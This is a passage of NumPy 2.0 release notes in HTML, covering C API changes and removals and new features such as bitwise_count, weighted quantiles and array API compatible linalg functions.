Most or all users should use <code><span>PyDataType_FLAGCHK</span></code> which is available on
1.x and does not require backporting.
Cython users should use Cython 3.  Otherwise access will go through Python
unless they use <code><span>PyDataType_FLAGCHK</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25816">gh-25816</a>)</p>
</li>
</ul>
<section id="datetime-functionality-exposed-in-the-c-api-and-cython-bindings">
<h3>Datetime functionality exposed in the C API and Cython bindings<a href="#datetime-functionality-exposed-in-the-c-api-and-cython-bindings" title="Link to this heading">#</a></h3>
<p>The functions <code><span>NpyDatetime_ConvertDatetime64ToDatetimeStruct</span></code>,
<code><span>NpyDatetime_ConvertDatetimeStructToDatetime64</span></code>,
<code><span>NpyDatetime_ConvertPyDateTimeToDatetimeStruct</span></code>,
<code><span>NpyDatetime_GetDatetimeISO8601StrLen</span></code>, <code><span>NpyDatetime_MakeISO8601Datetime</span></code>,
and <code><span>NpyDatetime_ParseISO8601Datetime</span></code> have been added to the C API to
facilitate converting between strings, Python datetimes, and NumPy datetimes in
external libraries.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/21199">gh-21199</a>)</p>
</section>
<section id="const-correctness-for-the-generalized-ufunc-c-api">
<h3>Const correctness for the generalized ufunc C API<a href="#const-correctness-for-the-generalized-ufunc-c-api" title="Link to this heading">#</a></h3>
<p>The NumPy C API’s functions for constructing generalized ufuncs
(<code><span>PyUFunc_FromFuncAndData</span></code>, <code><span>PyUFunc_FromFuncAndDataAndSignature</span></code>,
<code><span>PyUFunc_FromFuncAndDataAndSignatureAndIdentity</span></code>) take <code><span>types</span></code> and <code><span>data</span></code>
arguments that are not modified by NumPy’s internals. Like the <code><span>name</span></code> and
<code><span>doc</span></code> arguments, third-party Python extension modules are likely to supply
these arguments from static constants. The <code><span>types</span></code> and <code><span>data</span></code> arguments are
now const-correct: they are declared as <code><span>const</span> <span>char</span> <span>*types</span></code> and
<code><span>void</span> <span>*const</span> <span>*data</span></code>, respectively. C code should not be affected, but C++
code may be.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23847">gh-23847</a>)</p>
</section>
<section id="larger-npy-maxdims-and-npy-maxargs-npy-ravel-axis-introduced">
<h3>Larger <code><span>NPY_MAXDIMS</span></code> and <code><span>NPY_MAXARGS</span></code>, <code><span>NPY_RAVEL_AXIS</span></code> introduced<a href="#larger-npy-maxdims-and-npy-maxargs-npy-ravel-axis-introduced" title="Link to this heading">#</a></h3>
<p><code><span>NPY_MAXDIMS</span></code> is now 64, you may want to review its use.  This is usually
used in a stack allocation, where the increase should be safe.
However, we do encourage generally to remove any use of <code><span>NPY_MAXDIMS</span></code> and
<code><span>NPY_MAXARGS</span></code> to eventually allow removing the constraint completely.
For the conversion helper and C-API functions mirroring Python ones such as
<code><span>take</span></code>, <code><span>NPY_MAXDIMS</span></code> was used to mean <code><span>axis=None</span></code>. Such usage must be
replaced with <code><span>NPY_RAVEL_AXIS</span></code>. See also <a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#migration-maxdims"><span>Increased maximum number of dimensions</span></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25149">gh-25149</a>)</p>
</section>
<section id="npy-maxargs-not-constant-and-pyarraymultiiterobject-size-change">
<h3><code><span>NPY_MAXARGS</span></code> not constant and <code><span>PyArrayMultiIterObject</span></code> size change<a href="#npy-maxargs-not-constant-and-pyarraymultiiterobject-size-change" title="Link to this heading">#</a></h3>
<p>Since <code><span>NPY_MAXARGS</span></code> was increased, it is now a runtime constant and not
compile-time constant anymore.
We expect almost no users to notice this.  But if used for stack allocations
it now must be replaced with a custom constant using <code><span>NPY_MAXARGS</span></code> as an
additional runtime check.</p>
<p>The <code><span>sizeof(PyArrayMultiIterObject)</span></code> no longer includes the full size
of the object.  We expect nobody to notice this change.  It was necessary
to avoid issues with Cython.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25271">gh-25271</a>)</p>
</section>
<section id="required-changes-for-custom-legacy-user-dtypes">
<h3>Required changes for custom legacy user dtypes<a href="#required-changes-for-custom-legacy-user-dtypes" title="Link to this heading">#</a></h3>
<p>In order to improve our DTypes it is unfortunately necessary
to break the ABI, which requires some changes for dtypes registered
with <code><span>PyArray_RegisterDataType</span></code>.
Please see the documentation of <code><span>PyArray_RegisterDataType</span></code> for how
to adapt your code and achieve compatibility with both 1.x and 2.x.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25792">gh-25792</a>)</p>
</section>
<section id="new-public-dtype-api">
<h3>New Public DType API<a href="#new-public-dtype-api" title="Link to this heading">#</a></h3>
<p>The C implementation of the NEP 42 DType API is now public. While the DType API
has shipped in NumPy for a few versions, it was only usable in sessions with a
special environment variable set. It is now possible to write custom DTypes
outside of NumPy using the new DType API and the normal <code><span>import_array()</span></code>
mechanism for importing the numpy C API.</p>
<p>See <a href="https://numpy.org/devdocs/reference/c-api/array.html#dtype-api"><span>Custom Data Types</span></a> for more details about the API. As always with a new
feature, please report any bugs you run into implementing or using a new
DType. It is likely that downstream C code that works with dtypes will need to
be updated to work correctly with new DTypes.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25754">gh-25754</a>)</p>
</section>
<section id="new-c-api-import-functions">
<h3>New C-API import functions<a href="#new-c-api-import-functions" title="Link to this heading">#</a></h3>
<p>We have now added <code><span>PyArray_ImportNumPyAPI</span></code> and <code><span>PyUFunc_ImportUFuncAPI</span></code>
as static inline functions to import the NumPy C-API tables.
The new functions have two advantages over <code><span>import_array</span></code> and
<code><span>import_ufunc</span></code>:</p>
<ul>
<li><p>They check whether the import was already performed and are light-weight
if not, allowing to add them judiciously (although this is not preferable
in most cases).</p></li>
<li><p>The old mechanisms were macros rather than functions which included a
<code><span>return</span></code> statement.</p></li>
</ul>
<p>The <code><span>PyArray_ImportNumPyAPI()</span></code> function is included in <code><span>npy_2_compat.h</span></code>
for simpler backporting.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25866">gh-25866</a>)</p>
</section>
<section id="structured-dtype-information-access-through-functions">
<h3>Structured dtype information access through functions<a href="#structured-dtype-information-access-through-functions" title="Link to this heading">#</a></h3>
<p>The dtype structures fields <code><span>c_metadata</span></code>, <code><span>names</span></code>,
<code><span>fields</span></code>, and <code><span>subarray</span></code> must now be accessed through new
functions following the same names, such as <code><span>PyDataType_NAMES</span></code>.
Direct access of the fields is not valid as they do not exist for
all <code><span>PyArray_Descr</span></code> instances.
The <code><span>metadata</span></code> field is kept, but the macro version should also be preferred.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25802">gh-25802</a>)</p>
</section>
<section id="descriptor-elsize-and-alignment-access">
<h3>Descriptor <code><span>elsize</span></code> and <code><span>alignment</span></code> access<a href="#descriptor-elsize-and-alignment-access" title="Link to this heading">#</a></h3>
<p>Unless compiling only with NumPy 2 support, the <code><span>elsize</span></code> and <code><span>aligment</span></code>
fields must now be accessed via <code><span>PyDataType_ELSIZE</span></code>,
<code><span>PyDataType_SET_ELSIZE</span></code>, and <code><span>PyDataType_ALIGNMENT</span></code>.
In cases where the descriptor is attached to an array, we advise
using <code><span>PyArray_ITEMSIZE</span></code> as it exists on all NumPy versions.
Please see <a href="https://numpy.org/devdocs/numpy_2_0_migration_guide.html#migration-c-descr"><span>The PyArray_Descr struct has been changed</span></a> for more information.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25943">gh-25943</a>)</p>
</section>
</section>
<section id="numpy-2-0-c-api-removals">
<h2>NumPy 2.0 C API removals<a href="#numpy-2-0-c-api-removals" title="Link to this heading">#</a></h2>
<ul>
<li><p><code><span>npy_interrupt.h</span></code> and the corresponding macros like <code><span>NPY_SIGINT_ON</span></code>
have been removed.  We recommend querying <code><span>PyErr_CheckSignals()</span></code> or
<code><span>PyOS_InterruptOccurred()</span></code> periodically (these do currently require
holding the GIL though).</p></li>
<li><p>The <code><span>noprefix.h</span></code> header has been removed. Replace missing symbols with
their prefixed counterparts (usually an added <code><span>NPY_</span></code> or <code><span>npy_</span></code>).</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23919">gh-23919</a>)</p>
</li>
<li><p><code><span>PyUFunc_GetPyVals</span></code>, <code><span>PyUFunc_handlefperr</span></code>, and <code><span>PyUFunc_checkfperr</span></code>
have been removed.
If needed, a new backwards compatible function to raise floating point errors
could be restored. Reason for removal: there are no known users and the
functions would have made <code><span>with</span> <span>np.errstate()</span></code> fixes much more difficult).</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23922">gh-23922</a>)</p>
</li>
<li><p>The <code><span>numpy/old_defines.h</span></code> which was part of the API deprecated since NumPy 1.7
has been removed.  This removes macros of the form <code><span>PyArray_CONSTANT</span></code>.
The <a href="https://github.com/numpy/numpy/blob/main/tools/replace_old_macros.sed">replace_old_macros.sed</a>
script may be useful to convert them to the <code><span>NPY_CONSTANT</span></code> version.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24011">gh-24011</a>)</p>
</li>
<li><p>The <code><span>legacy_inner_loop_selector</span></code> member of the ufunc struct is removed
to simplify improvements to the dispatching system.
There are no known users overriding or directly accessing this member.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24271">gh-24271</a>)</p>
</li>
<li><p><code><span>NPY_INTPLTR</span></code> has been removed to avoid confusion (see <code><span>intp</span></code>
redefinition).</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24888">gh-24888</a>)</p>
</li>
<li><p>The advanced indexing <code><span>MapIter</span></code> and related API has been removed.
The (truly) public part of it was not well tested and had only one
known user (Theano).  Making it private will simplify improvements
to speed up <code><span>ufunc.at</span></code>, make advanced indexing more maintainable,
and was important for increasing the maximum number of dimensions of arrays
to 64. Please let us know if this API is important to you so we can find a
solution together.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25138">gh-25138</a>)</p>
</li>
<li><p>The <code><span>NPY_MAX_ELSIZE</span></code> macro has been removed, as it only ever reflected
builtin numeric types and served no internal purpose.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25149">gh-25149</a>)</p>
</li>
<li><p><code><span>PyArray_REFCNT</span></code> and <code><span>NPY_REFCOUNT</span></code> are removed. Use <code><span>Py_REFCNT</span></code> instead.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25156">gh-25156</a>)</p>
</li>
<li><p><code><span>PyArrayFlags_Type</span></code> and <code><span>PyArray_NewFlagsObject</span></code> as well as
<code><span>PyArrayFlagsObject</span></code> are private now.
There is no known use-case; use the Python API if needed.</p></li>
<li><p><code><span>PyArray_MoveInto</span></code>, <code><span>PyArray_CastTo</span></code>, <code><span>PyArray_CastAnyTo</span></code> are removed
use <code><span>PyArray_CopyInto</span></code> and if absolutely needed <code><span>PyArray_CopyAnyInto</span></code>
(the latter does a flat copy).</p></li>
<li><p><code><span>PyArray_FillObjectArray</span></code> is removed, its only true use is for
implementing <code><span>np.empty</span></code>.  Create a new empty array or use
<code><span>PyArray_FillWithScalar()</span></code> (decrefs existing objects).</p></li>
<li><p><code><span>PyArray_CompareUCS4</span></code> and <code><span>PyArray_CompareString</span></code> are removed.
Use the standard C string comparison functions.</p></li>
<li><p><code><span>PyArray_ISPYTHON</span></code> is removed as it is misleading, has no known
use-cases, and is easy to replace.</p></li>
<li><p><code><span>PyArray_FieldNames</span></code> is removed, as it is unclear what it would
be useful for.  It also has incorrect semantics in some possible
use-cases.</p></li>
<li><p><code><span>PyArray_TypestrConvert</span></code> is removed, since it seems a misnomer and unlikely
to be used by anyone.  If you know the size or are limited to few types, just
use it explicitly, otherwise go via Python strings.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25292">gh-25292</a>)</p>
</li>
<li><p><code><span>PyDataType_GetDatetimeMetaData</span></code> has been removed, it did not actually
do anything since at least NumPy 1.7.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25802">gh-25802</a>)</p>
</li>
</ul>
<section id="pyarray-getcastfunc-was-removed">
<h3><code><span>PyArray_GetCastFunc</span></code> was removed<a href="#pyarray-getcastfunc-was-removed" title="Link to this heading">#</a></h3>
<p>Note that custom legacy user dtypes can still provide a castfunc
as their implementation, but any access to them is now removed.
The reason for this is that NumPy never used these internally
for many years.
If you use simple numeric types, please just use C casts directly.
In case you require an alternative, please let us know so we can
create new API such as <code><span>PyArray_CastBuffer()</span></code> which could
use old or new cast functions depending on the NumPy version.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25161">gh-25161</a>)</p>
</section>
</section>
<section id="new-features">
<h2>New Features<a href="#new-features" title="Link to this heading">#</a></h2>
<ul>
<li><p><code><span>np.add</span></code> was extended to work with <code><span>unicode</span></code> and <code><span>bytes</span></code> dtypes.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24858">gh-24858</a>)</p>
</li>
</ul>
<section id="a-new-bitwise-count-function">
<h3>A new <code><span>bitwise_count</span></code> function<a href="#a-new-bitwise-count-function" title="Link to this heading">#</a></h3>
<p>This new function counts the number of 1-bits in a number.
<a href="https://numpy.org/devdocs/reference/generated/numpy.bitwise_count.html#numpy.bitwise_count" title="numpy.bitwise_count"><code><span>bitwise_count</span></code></a> works on all the numpy integer types and
integer-like objects.</p>
<div><pre><span></span><span>&gt;&gt;&gt; </span><span>a</span> <span>=</span> <span>np</span><span>.</span><span>array</span><span>([</span><span>2</span><span>**</span><span>i</span> <span>-</span> <span>1</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>16</span><span>)])</span>
<span>&gt;&gt;&gt; </span><span>np</span><span>.</span><span>bitwise_count</span><span>(</span><span>a</span><span>)</span>
<span>array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15],</span>
<span>      dtype=uint8)</span>
</pre></div>
<p>(<a href="https://github.com/numpy/numpy/pull/19355">gh-19355</a>)</p>
</section>
<section id="macos-accelerate-support-including-the-ilp64">
<h3>macOS Accelerate support, including the ILP64<a href="#macos-accelerate-support-including-the-ilp64" title="Link to this heading">#</a></h3>
<p>Support for the updated Accelerate BLAS/LAPACK library, including ILP64 (64-bit
integer) support, in macOS 13.3 has been added. This brings arm64 support, and
significant performance improvements of up to 10x for commonly used linear
algebra operations. When Accelerate is selected at build time, or if no
explicit BLAS library selection is done, the 13.3+ version will automatically
be used if available.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24053">gh-24053</a>)</p>
<p>Binary wheels are also available. On macOS &gt;=14.0, users who install NumPy from
PyPI will get wheels built against Accelerate rather than OpenBLAS.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25255">gh-25255</a>)</p>
</section>
<section id="option-to-use-weights-for-quantile-and-percentile-functions">
<h3>Option to use weights for quantile and percentile functions<a href="#option-to-use-weights-for-quantile-and-percentile-functions" title="Link to this heading">#</a></h3>
<p>A <code><span>weights</span></code> keyword is now available for <a href="https://numpy.org/devdocs/reference/generated/numpy.quantile.html#numpy.quantile" title="numpy.quantile"><code><span>quantile</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.percentile.html#numpy.percentile" title="numpy.percentile"><code><span>percentile</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.nanquantile.html#numpy.nanquantile" title="numpy.nanquantile"><code><span>nanquantile</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.nanpercentile.html#numpy.nanpercentile" title="numpy.nanpercentile"><code><span>nanpercentile</span></code></a>. Only
<code><span>method="inverted_cdf"</span></code> supports weights.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24254">gh-24254</a>)</p>
</section>
<section id="improved-cpu-optimization-tracking">
<h3>Improved CPU optimization tracking<a href="#improved-cpu-optimization-tracking" title="Link to this heading">#</a></h3>
<p>A new tracer mechanism is available which enables tracking of the enabled
targets for each optimized function (i.e., that uses hardware-specific SIMD
instructions) in the NumPy library. With this enhancement, it becomes possible
to precisely monitor the enabled CPU dispatch targets for the dispatched
functions.</p>
<p>A new function named <code><span>opt_func_info</span></code> has been added to the new namespace
<a href="https://numpy.org/devdocs/reference/generated/numpy.lib.introspect.html#module-numpy.lib.introspect" title="numpy.lib.introspect"><code><span>numpy.lib.introspect</span></code></a>, offering this tracing capability. This function allows
you to retrieve information about the enabled targets based on function names
and data type signatures.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24420">gh-24420</a>)</p>
</section>
<section id="a-new-meson-backend-for-f2py">
<h3>A new Meson backend for <code><span>f2py</span></code><a href="#a-new-meson-backend-for-f2py" title="Link to this heading">#</a></h3>
<p><code><span>f2py</span></code> in compile mode (i.e. <code><span>f2py</span> <span>-c</span></code>) now accepts the <code><span>--backend</span> <span>meson</span></code>
option. This is the default option for Python &gt;=3.12. For older Python versions,
<code><span>f2py</span></code> will still default to <code><span>--backend</span> <span>distutils</span></code>.</p>
<p>To support this in realistic use-cases, in compile mode <code><span>f2py</span></code> takes a
<code><span>--dep</span></code> flag one or many times which maps to <code><span>dependency()</span></code> calls in the
<code><span>meson</span></code> backend, and does nothing in the <code><span>distutils</span></code> backend.</p>
<p>There are no changes for users of <code><span>f2py</span></code> only as a code generator, i.e. without <code><span>-c</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24532">gh-24532</a>)</p>
</section>
<section id="bind-c-support-for-f2py">
<h3><code><span>bind(c)</span></code> support for <code><span>f2py</span></code><a href="#bind-c-support-for-f2py" title="Link to this heading">#</a></h3>
<p>Both functions and subroutines can be annotated with <code><span>bind(c)</span></code>. <code><span>f2py</span></code> will
handle both the correct type mapping, and preserve the unique label for other
C interfaces.</p>
<p><strong>Note:</strong> <code><span>bind(c,</span> <span>name</span> <span>=</span> <span>'routine_name_other_than_fortran_routine')</span></code> is not
honored by the <code><span>f2py</span></code> bindings by design, since <code><span>bind(c)</span></code> with the <code><span>name</span></code>
is meant to guarantee only the same name in C and Fortran, not in Python and
Fortran.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24555">gh-24555</a>)</p>
</section>
<section id="a-new-strict-option-for-several-testing-functions">
<h3>A new <code><span>strict</span></code> option for several testing functions<a href="#a-new-strict-option-for-several-testing-functions" title="Link to this heading">#</a></h3>
<p>The <code><span>strict</span></code> keyword is now available for <a href="https://numpy.org/devdocs/reference/generated/numpy.testing.assert_allclose.html#numpy.testing.assert_allclose" title="numpy.testing.assert_allclose"><code><span>assert_allclose</span></code></a>,
<a href="https://numpy.org/devdocs/reference/generated/numpy.testing.assert_equal.html#numpy.testing.assert_equal" title="numpy.testing.assert_equal"><code><span>assert_equal</span></code></a>, and <a href="https://numpy.org/devdocs/reference/generated/numpy.testing.assert_array_less.html#numpy.testing.assert_array_less" title="numpy.testing.assert_array_less"><code><span>assert_array_less</span></code></a>.
Setting <code><span>strict=True</span></code> will disable the broadcasting behaviour for scalars
and ensure that input arrays have the same data type.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24680">gh-24680</a>,
<a href="https://github.com/numpy/numpy/pull/24770">gh-24770</a>,
<a href="https://github.com/numpy/numpy/pull/24775">gh-24775</a>)</p>
</section>
<section id="add-np-core-umath-find-and-np-core-umath-rfind-ufuncs">
<h3>Add <code><span>np.core.umath.find</span></code> and <code><span>np.core.umath.rfind</span></code> UFuncs<a href="#add-np-core-umath-find-and-np-core-umath-rfind-ufuncs" title="Link to this heading">#</a></h3>
<p>Add two <code><span>find</span></code> and <code><span>rfind</span></code> UFuncs that operate on unicode or byte strings
and are used in <code><span>np.char</span></code>. They operate similar to <code><span>str.find</span></code> and
<code><span>str.rfind</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24868">gh-24868</a>)</p>
</section>
<section id="diagonal-and-trace-for-numpy-linalg">
<h3><code><span>diagonal</span></code> and <code><span>trace</span></code> for <a href="https://numpy.org/devdocs/reference/routines.linalg.html#module-numpy.linalg" title="numpy.linalg"><code><span>numpy.linalg</span></code></a><a href="#diagonal-and-trace-for-numpy-linalg" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.diagonal.html#numpy.linalg.diagonal" title="numpy.linalg.diagonal"><code><span>numpy.linalg.diagonal</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.trace.html#numpy.linalg.trace" title="numpy.linalg.trace"><code><span>numpy.linalg.trace</span></code></a> have been
added, which are array API standard-compatible variants of <a href="https://numpy.org/devdocs/reference/generated/numpy.diagonal.html#numpy.diagonal" title="numpy.diagonal"><code><span>numpy.diagonal</span></code></a> and
<a href="https://numpy.org/devdocs/reference/generated/numpy.trace.html#numpy.trace" title="numpy.trace"><code><span>numpy.trace</span></code></a>. They differ in the default axis selection which define 2-D
sub-arrays.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24887">gh-24887</a>)</p>
</section>
<section id="new-long-and-ulong-dtypes">
<h3>New <code><span>long</span></code> and <code><span>ulong</span></code> dtypes<a href="#new-long-and-ulong-dtypes" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/arrays.scalars.html#numpy.long" title="numpy.long"><code><span>numpy.long</span></code></a> and <a href="https://numpy.org/devdocs/reference/arrays.scalars.html#numpy.ulong" title="numpy.ulong"><code><span>numpy.ulong</span></code></a> have been added as NumPy integers mapping
to C’s <code><span>long</span></code> and <code><span>unsigned</span> <span>long</span></code>. Prior to NumPy 1.24, <code><span>numpy.long</span></code> was
an alias to Python’s <code><span>int</span></code>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24922">gh-24922</a>)</p>
</section>
<section id="svdvals-for-numpy-linalg">
<h3><code><span>svdvals</span></code> for <a href="https://numpy.org/devdocs/reference/routines.linalg.html#module-numpy.linalg" title="numpy.linalg"><code><span>numpy.linalg</span></code></a><a href="#svdvals-for-numpy-linalg" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.svdvals.html#numpy.linalg.svdvals" title="numpy.linalg.svdvals"><code><span>numpy.linalg.svdvals</span></code></a> has been added. It computes singular values for
(a stack of) matrices. Executing <code><span>np.svdvals(x)</span></code> is the same as calling
<code><span>np.svd(x,</span> <span>compute_uv=False,</span> <span>hermitian=False)</span></code>.
This function is compatible with the array API standard.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/24940">gh-24940</a>)</p>
</section>
<section id="a-new-isdtype-function">
<h3>A new <code><span>isdtype</span></code> function<a href="#a-new-isdtype-function" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.isdtype.html#numpy.isdtype" title="numpy.isdtype"><code><span>numpy.isdtype</span></code></a> was added to provide a canonical way to classify NumPy’s dtypes
in compliance with the array API standard.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25054">gh-25054</a>)</p>
</section>
<section id="a-new-astype-function">
<h3>A new <code><span>astype</span></code> function<a href="#a-new-astype-function" title="Link to this heading">#</a></h3>
<p><a href="https://numpy.org/devdocs/reference/generated/numpy.astype.html#numpy.astype" title="numpy.astype"><code><span>numpy.astype</span></code></a> was added to provide an array API standard-compatible
alternative to the <a href="https://numpy.org/devdocs/reference/generated/numpy.ndarray.astype.html#numpy.ndarray.astype" title="numpy.ndarray.astype"><code><span>numpy.ndarray.astype</span></code></a> method.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25079">gh-25079</a>)</p>
</section>
<section id="array-api-compatible-functions-aliases">
<h3>Array API compatible functions’ aliases<a href="#array-api-compatible-functions-aliases" title="Link to this heading">#</a></h3>
<p>13 aliases for existing functions were added to improve compatibility with the array API standard:</p>
<ul>
<li><p>Trigonometry: <code><span>acos</span></code>, <code><span>acosh</span></code>, <code><span>asin</span></code>, <code><span>asinh</span></code>, <code><span>atan</span></code>, <code><span>atanh</span></code>, <code><span>atan2</span></code>.</p></li>
<li><p>Bitwise: <code><span>bitwise_left_shift</span></code>, <code><span>bitwise_invert</span></code>, <code><span>bitwise_right_shift</span></code>.</p></li>
<li><p>Misc: <code><span>concat</span></code>, <code><span>permute_dims</span></code>, <code><span>pow</span></code>.</p></li>
<li><p>In <code><span>numpy.linalg</span></code>: <code><span>tensordot</span></code>, <code><span>matmul</span></code>.</p></li>
</ul>
<p>(<a href="https://github.com/numpy/numpy/pull/25086">gh-25086</a>)</p>
</section>
<section id="new-unique-functions">
<h3>New <code><span>unique_*</span></code> functions<a href="#new-unique-functions" title="Link to this heading">#</a></h3>
<p>The <a href="https://numpy.org/devdocs/reference/generated/numpy.unique_all.html#numpy.unique_all" title="numpy.unique_all"><code><span>unique_all</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.unique_counts.html#numpy.unique_counts" title="numpy.unique_counts"><code><span>unique_counts</span></code></a>, <a href="https://numpy.org/devdocs/reference/generated/numpy.unique_inverse.html#numpy.unique_inverse" title="numpy.unique_inverse"><code><span>unique_inverse</span></code></a>,
and <a href="https://numpy.org/devdocs/reference/generated/numpy.unique_values.html#numpy.unique_values" title="numpy.unique_values"><code><span>unique_values</span></code></a> functions have been added. They provide
functionality of <a href="https://numpy.org/devdocs/reference/generated/numpy.unique.html#numpy.unique" title="numpy.unique"><code><span>unique</span></code></a> with different sets of flags. They are array API
standard-compatible, and because the number of arrays they return does not
depend on the values of input arguments, they are easier to target for JIT
compilation.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25088">gh-25088</a>)</p>
</section>
<section id="matrix-transpose-support-for-ndarrays">
<h3>Matrix transpose support for ndarrays<a href="#matrix-transpose-support-for-ndarrays" title="Link to this heading">#</a></h3>
<p>NumPy now offers support for calculating the matrix transpose of an array (or
stack of arrays). The matrix transpose is equivalent to swapping the last two
axes of an array. Both <code><span>np.ndarray</span></code> and <code><span>np.ma.MaskedArray</span></code> now expose a
<code><span>.mT</span></code> attribute, and there is a matching new <a href="https://numpy.org/devdocs/reference/generated/numpy.matrix_transpose.html#numpy.matrix_transpose" title="numpy.matrix_transpose"><code><span>numpy.matrix_transpose</span></code></a>
function.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/23762">gh-23762</a>)</p>
</section>
<section id="array-api-compatible-functions-for-numpy-linalg">
<h3>Array API compatible functions for <code><span>numpy.linalg</span></code><a href="#array-api-compatible-functions-for-numpy-linalg" title="Link to this heading">#</a></h3>
<p>Six new functions and two aliases were added to improve compatibility with
the Array API standard for <a href="https://numpy.org/devdocs/reference/routines.linalg.html#module-numpy.linalg" title="numpy.linalg"><code><span>numpy.linalg</span></code></a>:</p>
<ul>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.matrix_norm.html#numpy.linalg.matrix_norm" title="numpy.linalg.matrix_norm"><code><span>numpy.linalg.matrix_norm</span></code></a> - Computes the matrix norm of a matrix (or a stack of matrices).</p></li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.vector_norm.html#numpy.linalg.vector_norm" title="numpy.linalg.vector_norm"><code><span>numpy.linalg.vector_norm</span></code></a> - Computes the vector norm of a vector (or batch of vectors).</p></li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.vecdot.html#numpy.vecdot" title="numpy.vecdot"><code><span>numpy.vecdot</span></code></a> - Computes the (vector) dot product of two arrays.</p></li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.vecdot.html#numpy.linalg.vecdot" title="numpy.linalg.vecdot"><code><span>numpy.linalg.vecdot</span></code></a> - An alias for <a href="https://numpy.org/devdocs/reference/generated/numpy.vecdot.html#numpy.vecdot" title="numpy.vecdot"><code><span>numpy.vecdot</span></code></a>.</p></li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.matrix_transpose.html#numpy.linalg.matrix_transpose" title="numpy.linalg.matrix_transpose"><code><span>numpy.linalg.matrix_transpose</span></code></a> - An alias for <a href="https://numpy.org/devdocs/reference/generated/numpy.matrix_transpose.html#numpy.matrix_transpose" title="numpy.matrix_transpose"><code><span>numpy.matrix_transpose</span></code></a>.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25155">gh-25155</a>)</p>
</li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.outer.html#numpy.linalg.outer" title="numpy.linalg.outer"><code><span>numpy.linalg.outer</span></code></a> has been added. It computes the outer product of two
vectors. It differs from <a href="https://numpy.org/devdocs/reference/generated/numpy.outer.html#numpy.outer" title="numpy.outer"><code><span>numpy.outer</span></code></a> by accepting one-dimensional arrays
only. This function is compatible with the array API standard.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25101">gh-25101</a>)</p>
</li>
<li><p><a href="https://numpy.org/devdocs/reference/generated/numpy.linalg.cross.html#numpy.linalg.cross" title="numpy.linalg.cross"><code><span>numpy.linalg.cross</span></code></a> has been added. It computes the cross product of two
(arrays of) 3-dimensional vectors. It differs from <a href="https://numpy.org/devdocs/reference/generated/numpy.cross.html#numpy.cross" title="numpy.cross"><code><span>numpy.cross</span></code></a> by accepting
three-dimensional vectors only. This function is compatible with the array
API standard.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25145">gh-25145</a>)</p>
</li>
</ul>
</section>
<section id="a-correction-argument-for-var-and-std">
<h3>A <code><span>correction</span></code> argument for <code><span>var</span></code> and <code><span>std</span></code><a href="#a-correction-argument-for-var-and-std" title="Link to this heading">#</a></h3>
<p>A <code><span>correction</span></code> argument was added to <a href="https://numpy.org/devdocs/reference/generated/numpy.var.html#numpy.var" title="numpy.var"><code><span>var</span></code></a> and <a href="https://numpy.org/devdocs/reference/generated/numpy.std.html#numpy.std" title="numpy.std"><code><span>std</span></code></a>, which is
an array API standard compatible alternative to <code><span>ddof</span></code>. As both arguments
serve a similar purpose, only one of them can be provided at the same time.</p>
<p>(<a href="https://github.com/numpy/numpy/pull/25169">gh-25169</a>)</p>
</section>
<section id="ndarray-device-and-ndarray-to-device">
